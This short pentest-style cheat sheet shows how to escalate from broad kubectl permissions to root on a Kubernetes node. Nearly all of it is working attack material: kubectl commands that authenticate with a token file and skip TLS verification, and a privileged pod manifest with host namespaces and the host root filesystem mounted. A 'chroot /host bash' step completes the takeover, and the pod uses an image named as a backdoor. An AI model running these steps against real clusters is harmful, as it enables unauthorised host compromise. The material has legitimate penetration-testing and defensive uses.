# everything-allowed
If you have `**` , everything allowed with kubectl, you can simply mount the host filesystem to a pod and become root on it. Here is the configuration yaml file, note the image has to be one that is available locally, if the machine doesn't have an internet connection.

```text-plain
kubectl --token $(cat token) --insecure-skip-tls-verify --server=https://10.10.50.4:16443 -n default apply -f everything-allowed-exec-pod.yaml
```

```text-plain
kubectl --token $(cat token) --insecure-skip-tls-verify --server=https://10.10.50.4:16443 -n default exec -it everything-allowed-exec-pod -- chroot /host bash
```

```text-plain
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: docker.io/vulhub/php:8.1-backdoor
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
```